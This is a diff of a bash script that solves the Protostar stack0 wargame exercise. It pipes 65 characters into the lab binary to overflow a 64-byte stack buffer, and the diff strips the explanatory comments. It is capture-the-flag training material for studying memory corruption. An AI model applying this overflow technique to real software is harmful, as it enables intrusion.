@@ -1,4 +1,2 @@
 #!/bin/bash
-# Write more than 64 characters (65 in this case) onto stdin of the program
-# The first 64 bytes fill the buffer, the last byte is written into modified
 echo "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa" | /opt/protostar/bin/stack0
